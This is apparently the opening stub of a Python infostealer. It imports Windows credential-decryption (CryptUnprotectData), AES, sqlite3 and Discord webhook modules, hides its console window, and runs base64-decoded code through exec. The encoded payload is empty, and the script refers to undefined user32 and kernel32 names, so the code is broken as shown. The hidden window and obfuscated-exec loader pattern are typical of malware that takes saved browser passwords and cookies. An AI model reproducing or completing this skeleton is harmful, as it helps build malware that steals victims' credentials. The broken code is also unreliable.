import base64
import json
import os
import shutil
import sqlite3
import ctypes
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

exec(base64.b64decode(""))
